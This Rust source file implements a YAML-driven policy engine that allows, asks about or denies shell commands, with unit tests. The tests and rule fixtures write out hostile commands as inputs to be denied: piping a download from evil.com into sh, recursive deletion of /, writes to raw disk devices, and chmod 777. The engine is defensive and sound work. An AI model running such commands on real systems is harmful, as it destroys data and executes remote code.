use serde::Deserialize;
use std::fs;
use std::path::Path;

use crate::parser::{self, SimpleCommand, Statement};
use crate::types::{Decision, PolicyResult};

/// Top-level rules configuration loaded from YAML.
#[derive(Debug, Deserialize)]
pub struct RulesConfig {
    #[allow(dead_code)]
    pub version: u32,
    #[serde(default = "default_decision")]
    pub default_decision: Decision,
    #[serde(default = "default_safety_level")]
    pub safety_level: SafetyLevel,
    #[serde(default)]
    pub allowlists: Allowlists,
    #[serde(default)]
    pub rules: Vec<Rule>,
}

fn default_decision() -> Decision { Decision::Ask }
fn default_safety_level() -> SafetyLevel { SafetyLevel::High }

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum SafetyLevel {
    Critical,
    High,
    Strict,
}

#[derive(Debug, Default, Deserialize)]
pub struct Allowlists {
    #[serde(default)]
    pub commands: Vec<String>,
    #[serde(default)]
    #[allow(dead_code)]
    pub paths: Vec<String>,
}

#[derive(Debug, Deserialize)]
pub struct Rule {
    pub id: String,
    pub level: SafetyLevel,
    #[serde(rename = "match")]
    pub matcher: Matcher,
    pub decision: Decision,
    pub reason: String,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
pub enum Matcher {
    Pipeline { pipeline: PipelineMatcher },
    Redirect { redirect: RedirectMatcher },
    Command {
        command: StringOrList,
        #[serde(default)]
        flags: Option<FlagsMatcher>,
        #[serde(default)]
        args: Option<ArgsMatcher>,
    },
}

#[derive(Debug, Deserialize)]
pub struct PipelineMatcher {
    pub stages: Vec<StageMatcher>,
}

#[derive(Debug, Deserialize)]
pub struct StageMatcher {
    pub command: StringOrList,
}

#[derive(Debug, Deserialize)]
pub struct RedirectMatcher {
    #[serde(default)]
    pub op: Option<StringOrList>,
    #[serde(default)]
    pub target: Option<StringOrList>,
}

#[derive(Debug, Deserialize)]
pub struct FlagsMatcher {
    #[serde(default)]
    pub any_of: Vec<String>,
    #[serde(default)]
    pub all_of: Vec<String>,
}

#[derive(Debug, Deserialize)]
pub struct ArgsMatcher {
    #[serde(default)]
    pub any_of: Vec<String>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
pub enum StringOrList {
    Single(String),
    List { any_of: Vec<String> },
}

impl StringOrList {
    pub fn matches(&self, value: &str) -> bool {
        match self {
            StringOrList::Single(s) => s == value,
            StringOrList::List { any_of } => any_of.iter().any(|s| s == value),
        }
    }
}

/// Load rules from a YAML file.
pub fn load_rules(path: &Path) -> Result<RulesConfig, String> {
    let content = fs::read_to_string(path)
        .map_err(|e| format!("Failed to read rules file {}: {e}", path.display()))?;
    let config: RulesConfig = serde_yaml::from_str(&content)
        .map_err(|e| format!("Failed to parse rules file {}: {e}", path.display()))?;
    Ok(config)
}

/// Evaluate a parsed statement against the policy rules.
/// Returns the most restrictive decision across all leaves and pipeline rules.
pub fn evaluate(config: &RulesConfig, stmt: &Statement) -> PolicyResult {
    let leaves = parser::flatten(stmt);
    let mut worst = PolicyResult::allow();

    // Check pipeline rules against all pipelines in the statement tree
    let pipelines = collect_pipelines(stmt);
    for rule in &config.rules {
        if rule.level > config.safety_level {
            continue;
        }
        if let Matcher::Pipeline { ref pipeline } = rule.matcher {
            for pipe in &pipelines {
                if matches_pipeline(pipeline, pipe) {
                    let result = PolicyResult {
                        decision: rule.decision,
                        rule_id: Some(rule.id.clone()),
                        reason: rule.reason.clone(),
                    };
                    if result.decision > worst.decision {
                        worst = result;
                    }
                }
            }
        }
    }

    // Then evaluate each leaf node
    for leaf in &leaves {
        let result = evaluate_leaf(config, leaf);
        if result.decision > worst.decision {
            worst = result;
        }
    }

    // If nothing matched and not all leaves are allowlisted, use default decision
    if worst.decision == Decision::Allow && worst.rule_id.is_none() {
        let all_allowlisted = leaves.iter().all(|leaf| is_allowlisted(config, leaf));
        if !all_allowlisted {
            return PolicyResult {
                decision: config.default_decision,
                rule_id: None,
                reason: "No matching rule; using default decision".to_string(),
            };
        }
    }

    worst
}

/// Collect all Pipeline nodes from a statement tree.
fn collect_pipelines(stmt: &Statement) -> Vec<&parser::Pipeline> {
    match stmt {
        Statement::Pipeline(p) => vec![p],
        Statement::List(l) => {
            let mut out = collect_pipelines(&l.first);
            for (_, s) in &l.rest {
                out.extend(collect_pipelines(s));
            }
            out
        }
        Statement::Subshell(inner) | Statement::CommandSubstitution(inner) => {
            collect_pipelines(inner)
        }
        _ => vec![],
    }
}

/// Evaluate a single leaf node (SimpleCommand or Opaque).
fn evaluate_leaf(config: &RulesConfig, leaf: &Statement) -> PolicyResult {
    match leaf {
        Statement::Opaque(_) => PolicyResult {
            decision: Decision::Ask,
            rule_id: None,
            reason: "Unrecognized command structure".to_string(),
        },
        Statement::SimpleCommand(cmd) => {
            // Check allowlists first
            if is_command_allowlisted(config, cmd) {
                return PolicyResult::allow();
            }

            let mut worst = PolicyResult::allow();
            for rule in &config.rules {
                // Skip rules above the configured safety level
                if rule.level > config.safety_level {
                    continue;
                }
                if matches_rule(&rule.matcher, cmd) {
                    let result = PolicyResult {
                        decision: rule.decision,
                        rule_id: Some(rule.id.clone()),
                        reason: rule.reason.clone(),
                    };
                    if result.decision > worst.decision {
                        worst = result;
                    }
                }
            }
            worst
        }
        _ => PolicyResult::allow(),
    }
}

/// Check if a leaf node is allowlisted.
fn is_allowlisted(config: &RulesConfig, leaf: &Statement) -> bool {
    match leaf {
        Statement::SimpleCommand(cmd) => is_command_allowlisted(config, cmd),
        _ => false,
    }
}

/// Check if a SimpleCommand matches any allowlist entry.
/// Entries like "git status" match command name + required args.
/// Bare entries like "ls" match any invocation of that command.
fn is_command_allowlisted(config: &RulesConfig, cmd: &SimpleCommand) -> bool {
    let cmd_name = match &cmd.name {
        Some(n) => n.as_str(),
        None => return false,
    };

    for entry in &config.allowlists.commands {
        let parts: Vec<&str> = entry.split_whitespace().collect();
        if parts.is_empty() {
            continue;
        }
        if parts[0] != cmd_name {
            continue;
        }
        if parts.len() == 1 {
            // Bare command name matches any invocation
            return true;
        }
        // Multi-word entry: all additional parts must appear in argv
        let required_args = &parts[1..];
        let all_present = required_args.iter().all(|req| cmd.argv.iter().any(|a| a == req));
        if all_present {
            return true;
        }
    }
    false
}

/// Check if a rule's matcher matches a given SimpleCommand.
/// Pipeline matchers are handled separately in `evaluate` and are skipped here.
fn matches_rule(matcher: &Matcher, cmd: &SimpleCommand) -> bool {
    match matcher {
        Matcher::Command {
            command,
            flags,
            args,
        } => {
            let cmd_name = match &cmd.name {
                Some(n) => n.as_str(),
                None => return false,
            };
            if !command.matches(cmd_name) {
                return false;
            }
            // Check flags
            if let Some(flags_matcher) = flags {
                if !flags_matcher.any_of.is_empty() {
                    let has_any = flags_matcher
                        .any_of
                        .iter()
                        .any(|f| cmd.argv.iter().any(|a| a == f));
                    if !has_any {
                        return false;
                    }
                }
                if !flags_matcher.all_of.is_empty() {
                    let has_all = flags_matcher
                        .all_of
                        .iter()
                        .all(|f| cmd.argv.iter().any(|a| a == f));
                    if !has_all {
                        return false;
                    }
                }
            }
            // Check args with glob matching
            if let Some(args_matcher) = args {
                if !args_matcher.any_of.is_empty() {
                    let has_any = args_matcher.any_of.iter().any(|pattern| {
                        cmd.argv.iter().any(|a| glob_match::glob_match(pattern, a))
                    });
                    if !has_any {
                        return false;
                    }
                }
            }
            true
        }
        Matcher::Redirect { redirect } => matches_redirect(redirect, cmd),
        Matcher::Pipeline { .. } => {
            // Pipeline matching is handled at the statement level in evaluate()
            false
        }
    }
}

/// Check if a pipeline matcher's stages appear as a subsequence in the pipeline's stages.
fn matches_pipeline(matcher: &PipelineMatcher, pipe: &parser::Pipeline) -> bool {
    if matcher.stages.is_empty() {
        return false;
    }

    let mut matcher_idx = 0;
    for stage in &pipe.stages {
        if matcher_idx >= matcher.stages.len() {
            break;
        }
        if let Statement::SimpleCommand(cmd) = stage {
            if let Some(ref name) = cmd.name {
                if matcher.stages[matcher_idx].command.matches(name) {
                    matcher_idx += 1;
                }
            }
        }
    }
    matcher_idx == matcher.stages.len()
}

/// Check if any of the command's redirects match the redirect matcher.
fn matches_redirect(redirect_matcher: &RedirectMatcher, cmd: &SimpleCommand) -> bool {
    cmd.redirects.iter().any(|redir| {
        // Check op if specified
        let op_matches = match &redirect_matcher.op {
            Some(op_matcher) => op_matcher.matches(&redir.op.to_string()),
            None => true,
        };
        // Check target with glob matching if specified
        let target_matches = match &redirect_matcher.target {
            Some(target_matcher) => match target_matcher {
                StringOrList::Single(pattern) => {
                    glob_match::glob_match(pattern, &redir.target)
                }
                StringOrList::List { any_of } => {
                    any_of.iter().any(|p| glob_match::glob_match(p, &redir.target))
                }
            },
            None => true,
        };
        op_matches && target_matches
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_load_rules_yaml() {
        let yaml = r#"
version: 1
default_decision: ask
safety_level: high
allowlists:
  commands:
    - "git status"
    - "git diff"
  paths:
    - "/tmp/**"
rules:
  - id: rm-recursive-root
    level: critical
    match:
      command: rm
      flags:
        any_of: ["-r", "-R", "--recursive"]
      args:
        any_of: ["/", "/*"]
    decision: deny
    reason: "Recursive delete targeting critical system path"
  - id: curl-pipe-shell
    level: critical
    match:
      pipeline:
        stages:
          - command:
              any_of: [curl, wget]
          - command:
              any_of: [sh, bash, zsh]
    decision: deny
    reason: "Remote code execution: piping download to shell"
"#;
        let config: RulesConfig = serde_yaml::from_str(yaml).unwrap();
        assert_eq!(config.version, 1);
        assert_eq!(config.default_decision, Decision::Ask);
        assert_eq!(config.safety_level, SafetyLevel::High);
        assert_eq!(config.allowlists.commands.len(), 2);
        assert_eq!(config.rules.len(), 2);
        assert_eq!(config.rules[0].id, "rm-recursive-root");
        assert_eq!(config.rules[0].decision, Decision::Deny);
        assert_eq!(config.rules[1].id, "curl-pipe-shell");
    }

    #[test]
    fn test_string_or_list_single() {
        let s = StringOrList::Single("rm".to_string());
        assert!(s.matches("rm"));
        assert!(!s.matches("ls"));
    }

    #[test]
    fn test_string_or_list_any_of() {
        let s = StringOrList::List {
            any_of: vec!["curl".into(), "wget".into()],
        };
        assert!(s.matches("curl"));
        assert!(s.matches("wget"));
        assert!(!s.matches("git"));
    }

    #[test]
    fn test_safety_level_ordering() {
        assert!(SafetyLevel::Strict > SafetyLevel::High);
        assert!(SafetyLevel::High > SafetyLevel::Critical);
    }

    #[test]
    fn test_minimal_rules_config() {
        let yaml = "version: 1\nrules: []\n";
        let config: RulesConfig = serde_yaml::from_str(yaml).unwrap();
        assert_eq!(config.default_decision, Decision::Ask);
        assert_eq!(config.safety_level, SafetyLevel::High);
        assert!(config.rules.is_empty());
    }

    #[test]
    fn test_redirect_matcher_deserialization() {
        let yaml = r#"
version: 1
rules:
  - id: write-to-dev
    level: critical
    match:
      redirect:
        op:
          any_of: [">", ">>"]
        target:
          any_of: ["/dev/sda", "/dev/nvme0n1"]
    decision: deny
    reason: "Writing directly to disk device"
"#;
        let config: RulesConfig = serde_yaml::from_str(yaml).unwrap();
        assert_eq!(config.rules.len(), 1);
        assert_eq!(config.rules[0].id, "write-to-dev");
    }

    // --- Evaluation tests ---

    use crate::parser::parse;

    fn test_config() -> RulesConfig {
        let yaml = r#"
version: 1
default_decision: ask
safety_level: high
allowlists:
  commands:
    - "git status"
    - "git diff"
    - "git log"
    - ls
    - echo
  paths:
    - "/tmp/**"
rules:
  - id: rm-recursive-root
    level: critical
    match:
      command: rm
      flags:
        any_of: ["-r", "-R", "--recursive", "-rf", "-fr"]
      args:
        any_of: ["/", "/*"]
    decision: deny
    reason: "Recursive delete targeting critical system path"
  - id: curl-pipe-shell
    level: critical
    match:
      pipeline:
        stages:
          - command:
              any_of: [curl, wget]
          - command:
              any_of: [sh, bash, zsh]
    decision: deny
    reason: "Remote code execution: piping download to shell"
  - id: write-to-dev
    level: critical
    match:
      redirect:
        op:
          any_of: [">", ">>"]
        target:
          any_of: ["/dev/sda", "/dev/nvme0n1"]
    decision: deny
    reason: "Writing directly to disk device"
  - id: chmod-777
    level: high
    match:
      command: chmod
      args:
        any_of: ["777"]
    decision: ask
    reason: "Setting world-writable permissions"
"#;
        serde_yaml::from_str(yaml).unwrap()
    }

    #[test]
    fn test_evaluate_allowlisted_command() {
        let config = test_config();
        let stmt = parse("git status").unwrap();
        let result = evaluate(&config, &stmt);
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_evaluate_rm_rf_root_denied() {
        let config = test_config();
        let stmt = parse("rm -rf /").unwrap();
        let result = evaluate(&config, &stmt);
        assert_eq!(result.decision, Decision::Deny);
        assert_eq!(result.rule_id.as_deref(), Some("rm-recursive-root"));
    }

    #[test]
    fn test_evaluate_rm_rf_tmp_allowed() {
        let config = test_config();
        let stmt = parse("rm -rf /tmp/build").unwrap();
        let result = evaluate(&config, &stmt);
        assert_ne!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_curl_pipe_sh_denied() {
        let config = test_config();
        let stmt = parse("curl http://evil.com | sh").unwrap();
        let result = evaluate(&config, &stmt);
        assert_eq!(result.decision, Decision::Deny);
        assert_eq!(result.rule_id.as_deref(), Some("curl-pipe-shell"));
    }

    #[test]
    fn test_evaluate_safe_curl_allowed() {
        let config = test_config();
        let stmt = parse("curl http://example.com").unwrap();
        let result = evaluate(&config, &stmt);
        assert_ne!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_compound_most_restrictive() {
        let config = test_config();
        let stmt = parse("echo hello && rm -rf /").unwrap();
        let result = evaluate(&config, &stmt);
        assert_eq!(result.decision, Decision::Deny);
    }

    #[test]
    fn test_evaluate_chmod_777_asks() {
        let config = test_config();
        let stmt = parse("chmod 777 /tmp/file").unwrap();
        let result = evaluate(&config, &stmt);
        assert_eq!(result.decision, Decision::Ask);
        assert_eq!(result.rule_id.as_deref(), Some("chmod-777"));
    }

    #[test]
    fn test_evaluate_unknown_command_default_ask() {
        let config = test_config();
        let stmt = parse("some_unknown_command --flag").unwrap();
        let result = evaluate(&config, &stmt);
        assert_eq!(result.decision, Decision::Ask);
    }

    #[test]
    fn test_evaluate_ls_allowlisted() {
        let config = test_config();
        let stmt = parse("ls -la /home").unwrap();
        let result = evaluate(&config, &stmt);
        assert_eq!(result.decision, Decision::Allow);
    }

    #[test]
    fn test_evaluate_safety_level_filtering() {
        // With safety_level=critical, the chmod-777 rule (level=high) should be skipped
        let yaml = r#"
version: 1
default_decision: ask
safety_level: critical
allowlists:
  commands: []
rules:
  - id: chmod-777
    level: high
    match:
      command: chmod
      args:
        any_of: ["777"]
    decision: ask
    reason: "Setting world-writable permissions"
"#;
        let config: RulesConfig = serde_yaml::from_str(yaml).unwrap();
        let stmt = parse("chmod 777 /tmp/file").unwrap();
        let result = evaluate(&config, &stmt);
        // The high-level rule should be skipped at critical safety level,
        // so we get the default decision (ask) rather than a rule match
        assert_eq!(result.decision, Decision::Ask);
        assert!(result.rule_id.is_none(), "Rule should have been skipped due to safety level filtering");
    }

    #[test]
    fn test_load_default_rules_file() {
        let path = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("rules")
            .join("default-rules.yaml");
        let config = load_rules(&path).expect("Default rules should parse");
        assert!(config.rules.len() > 30, "Should have many rules, got {}", config.rules.len());
        assert_eq!(config.version, 1);
        assert_eq!(config.default_decision, Decision::Ask);
    }
}
